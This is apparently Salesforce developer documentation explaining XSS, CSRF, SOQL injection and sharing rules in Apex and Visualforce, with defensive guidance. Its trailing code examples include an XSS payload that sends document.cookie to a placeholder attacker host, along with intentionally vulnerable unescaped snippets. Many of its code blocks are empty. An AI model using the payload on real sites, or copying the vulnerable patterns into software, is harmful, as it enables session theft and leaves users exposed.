---
title: "Security Guidelines for Apex and Visualforce
        Development"
domain: securityImplGuide
topic: security-guidelines-for-apex-and-visualforce-development
apiVersion: 67.0
release: summer-26-v67
docType: concept
lastCollected: 2026-03-12T09:35:45.066Z
estimatedTokens: 3724
keywords: [Security, Guidelines, Apex, Visualforce, Development, Understand, guard, against, vulnerabilities, code, develop, custom, applications, Understanding, Cross-Site]
---

# Security Guidelines for Apex and Visualforce
        Development

> Understand and guard against vulnerabilities in your
            code as you develop custom applications.

# Security Guidelines for Apex and Visualforce Development

Understand and guard against vulnerabilities in your code as you develop custom applications.

| Available in: Salesforce Classic (not available in all orgs) |
| --- |
| Available in: Group, Professional, Enterprise, Performance, Unlimited, Developer, and Database.com EditionsVisualforce is not available in Database.com. |


## Understanding Security

The powerful combination of Apex and Visualforce pages allows Lightning Platform developers to provide custom functionality and business logic to Salesforce or to create a new standalone product running inside the Lightning Platform. But as with any programming language, developers must be cognizant of potential security-related pitfalls.

Salesforce has incorporated several security defenses in the Lightning Platform. But careless developers can still bypass the built-in defenses and then expose their applications and customers to security risks. Many of the coding mistakes a developer can make on the Lightning Platform are similar to general web application security vulnerabilities, while others are unique to Apex.

To certify an application for AppExchange, it’s important for developers to learn and understand the security flaws described. For more information, see the Lightning Platform Security Resources page on Salesforce Developers. [https://developer.salesforce.com/page/Security](https://developer.salesforce.com/page/Security "HTML (New Window)").

## Cross-Site Scripting (XSS)

Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is provided to a web application. The web application includes malicious scripting in a response to a user who unknowingly becomes the victim of the attack. The attacker uses the web application as an intermediary in the attack, taking advantage of the victim's trust for the web application. Most applications that display dynamic web pages without properly validating the data are likely to be vulnerable. Attacks against the website are especially easy if input from one user is shown to another user. Some obvious possibilities include bulletin board or user comment-style websites, news, or email archives.

For example, assume this script is included in a Lightning Platform page using a script component, an on\* event, or a Visualforce page.

```

```

This script block inserts the value of the user-supplied userparam onto the page. The attacker can then enter this value for userparam.

```

```

In this case, all cookies for the current page are sent to www.attacker.com as the query string in the request to the cookie.cgi script. At this point, the attacker has the victim's session cookie and can connect to the web application as if they were the victim.

The attacker can post a malicious script using a website or email. Web application users not only see the attacker's input, but their browser can execute the attacker's script in a trusted context. With this ability, the attacker can perform a wide variety of attacks against the victim. These attacks range from simple actions, such as opening and closing windows, to more malicious attacks, such as stealing data or session cookies, which allow an attacker full access to the victim's session.

For more information on this type of attack:

-   [http://www.owasp.org/index.php/Cross\_Site\_Scripting](http://www.owasp.org/index.php/Cross_Site_Scripting "HTML (New Window)")
-   [http://www.cgisecurity.com/xss-faq.html](http://www.cgisecurity.com/xss-faq.html "HTML (New Window)")
-   [http://www.owasp.org/index.php/Testing\_for\_Cross\_site\_scripting](http://www.owasp.org/index.php/Testing_for_Cross_site_scripting "HTML (New Window)")
-   [http://www.google.com/search?q=cross-site+scripting](http://www.google.com/search?q=cross-site+scripting "HTML (New Window)")

Within the Lightning Platform, several anti-XSS defenses are in place. For example, Salesforce has filters that screen out harmful characters in most output methods. For the developer using standard classes and output methods, the threats of XSS flaws are largely mitigated. But the creative developer can still find ways to intentionally or accidentally bypass the default controls.

### Existing Protection

All standard Visualforce components, which start with <apex\>, have anti-XSS filters in place to screen out harmful characters. For example, this code is normally vulnerable to an XSS attack because it takes user-supplied input and outputs it directly back to the user, but the <apex:outputText\> tag is XSS-safe. All characters that appear to be HTML tags are converted to their literal form. For example, the < character is converted to &lt; so that a literal < appears on the user's screen.

```

```

### Disabling Escape on Visualforce Tags

By default, nearly all Visualforce tags escape the XSS-vulnerable characters. You can disable this behavior by setting the optional attribute escape="false". For example, this output is vulnerable to XSS attacks.

```

```

### Programming Items Not Protected from XSS

Custom Javascript code and code within <apex:includeScript> components don’t have built-in XSS protections. These items allow the developer to customize the page with script commands. It doesn’t makes sense to include anti-XSS filters on commands that are intentionally added to a page.

### Custom JavaScript

If you write your own JavaScript, the Lightning Platform has no way to protect you. For example, this code is vulnerable to XSS if used in JavaScript.

```

```

### <apex:includeScript>

With the <apex:includeScript\> Visualforce component, you can include a custom script on a page. Make sure to validate that the content is safe and includes no user-supplied data. For example, this snippet is vulnerable because it includes user-supplied input as the value of the script text. The value provided by the tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data to this parameter as in the example, they’re able to direct the victim to include any JavaScript file from any other website.

```

```

## Formula Tags

The general syntax of these tags is:{!FUNCTION()} or {!$OBJECT.ATTRIBUTE}. For example, if a developer wanted to include a user's session ID in a link, they can create the link by using this syntax.

```

```

And it renders like this output.

```

```

Formula expressions can be function calls or can include information about platform objects, a user's environment, system environment, and the request environment. An important feature of these expressions is that data isn’t escaped during rendering. Because expressions are rendered on the server, it’s not possible to escape rendered data on the client using JavaScript or other client-side technology. It can be dangerous if the formula expression references nonsystem data that’s hostile or editable and the expression isn’t wrapped in a function to escape the output during rendering. A common vulnerability is created by using the {!$Request.\*} expression to access request parameters.

```

```

Unfortunately, the unescaped {!$Request.title} tag also results in a cross-site scripting vulnerability. For example, the request:

```

```

results in the output:

```

```

The standard mechanism to do server-side escaping is through the use of the SUBSTITUTE() formula tag. Given the placement of the {!$Request.\*} expression in the example, the described attack can be prevented by using these nested SUBSTITUTE() calls.

```

```

Depending on the placement of the tag and usage of the data, the characters needing escaping and their escaped counterparts can vary. For example, this statement:

```

```

requires that the double quote character is escaped with its URL encoded equivalent of %22 instead of the HTML escaped ", because it’s likely to be used in a link. Otherwise, the request:

```

```

results in:

```

```

The ret variable sometimes needs additional client-side escaping later in the page if used in a way that can cause included HTML control characters to be interpreted.

Formula tags can also be used to include platform object data. Although the data is taken directly from the user's org, it must still be escaped before use to prevent users from executing code in the context of other users, such as those with higher privilege levels. Only users within the same organization can perform these kinds of attacks. These attacks undermine user roles and reduce the integrity of auditing records. Data can be imported from external sources and not screened for malicious content.

## Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) flaws are less a programming mistake and more a lack of a defense. For example, an attacker has a web page at www.attacker.com that could be any web page, including one that provides valuable services or information that drives traffic to that site. Somewhere on the attacker's page is an HTML tag that looks like this:

```

```

In other words, the attacker's page contains a URL that performs an action on your website. If the user is still logged into your web page when they visit the attacker's web page, the URL is retrieved and the actions performed. This attack succeeds because the user is still authenticated to your web page. This attack is a simple example, and the attacker can get more creative by using scripts to generate the callback request or even use CSRF attacks against your AJAX methods.

For more information and traditional defenses:

-   [http://www.owasp.org/index.php/Cross-Site\_Request\_Forgery](http://www.owasp.org/index.php/Cross-Site_Request_Forgery "HTML (New Window)")
-   [http://www.cgisecurity.com/csrf-faq.html](http://www.cgisecurity.com/csrf-faq.html "HTML (New Window)")
-   [http://shiflett.org/articles/cross-site-request-forgeries](http://shiflett.org/articles/cross-site-request-forgeries "HTML (New Window)")

Within the Lightning Platform, Salesforce implemented an anti-CSRF token to prevent such an attack. Every page includes a random string of characters as a hidden form field. Upon the next page load, the application checks the validity of this string of characters and doesn’t execute the command unless the value matches the expected value. This feature protects you when using all of the standard controllers and methods.

Here again, the developer can bypass the built-in defenses without realizing the risk. For example, a custom controller takes the object ID as an input parameter and then uses that input parameter in a SOQL call.

```

```

The developer unknowingly bypassed the anti-CSRF controls by developing their own action method. The id parameter is read and used in the code. The anti-CSRF token is never read or validated. An attacking web page can send the user to this page by using a CSRF attack and providing any value for the id parameter.

There are no built-in defenses for such situations, and developers must be cautious about writing pages that act based on a user-supplied parameter like the id variable in the previous example. A possible work-around is to insert an intermediate confirmation page to make sure that the user intended to call the page. Other suggestions include shortening the idle session timeout and educating users to log out of their active session and not use their browser to visit other sites while authenticated.

Because of the Salesforce built-in defense against CSRF, your users can encounter an error when multiple Salesforce login pages are open. If the user logs in to Salesforce in one tab and then attempts to log in on another, they see this error: The page you submitted was invalid for your session. Users can successfully log in by refreshing the login page or by attempting to log in a second time.

## SOQL Injection

In other programming languages, the previous flaw is known as SQL injection. Apex doesn’t use SQL, but uses its own database query language, SOQL. SOQL is simpler and more limited in functionality than SQL. The risks are lower for SOQL injection than for SQL injection, but the attacks are nearly identical to traditional SQL injection. SQL/SOQL injection takes user-supplied input and uses those values in a dynamic SOQL query. If the input isn’t validated, it can include SOQL commands that effectively modify the SOQL statement and trick the application into performing unintended commands.

### SOQL Injection Vulnerability in Apex

Here’s a simple example of Apex and Visualforce code vulnerable to SOQL injection.

```

```

This simple example illustrates the logic. The code is intended to search for contacts that weren’t deleted. The user provides one input value called name. The value can be anything provided by the user, and it’s never validated. The SOQL query is built dynamically and then executed with the Database.query method. If the user provides a legitimate value, the statement executes as expected.

```

```

But what if the user provides unexpected input, such as:

```

```

In that case, the query string becomes:

```

```

Now the results show all contacts, not just the non-deleted ones. A SOQL Injection flaw can be used to modify the intended logic of any vulnerable query.

### SOQL Injection Defenses

To prevent a SOQL injection attack, avoid using dynamic SOQL queries. Instead, use static queries and binding variables. The preceding vulnerable example can be rewritten using static SOQL.

```

```

If you must use dynamic SOQL, use the escapeSingleQuotes method to sanitize user-supplied input. This method adds the escape character (\\) to all single quotation marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead of database commands.

## Data Access Control

The Lightning Platform makes extensive use of data sharing rules. Each object has permissions and can have sharing settings that users can read, create, edit, and delete. These settings are enforced when using all standard controllers.

When using an Apex class, the built-in user permissions and field-level security restrictions aren’t respected during execution. The default behavior is that an Apex class can read and update all data. Because these rules aren’t enforced, developers who use Apex must avoid inadvertently exposing sensitive data that’s normally hidden behind user permissions, field-level security, or defaults. For example, consider this Apex pseudo-code.

```

```

In this case, all contact records are searched, even if the user currently logged in doesn’t have permission to view these records. The solution is to use the qualifying keywords with sharing when declaring the class:

```

```

The with sharing keyword directs the platform to use the security sharing permissions of the user currently logged in, rather than granting full access to all records.

## Code Examples

```
<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>
```

```
1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2
```

```
<apex:outputText> 
    {!$CurrentPage.parameters.userInput} 
</apex:outputText>
```

```
<apex:outputText escape="false" value="{!$CurrentPage.parameters.userInput}" />
```

```
<script> 
    var foo = location.search; 
    document.write(foo); 
</script>
```
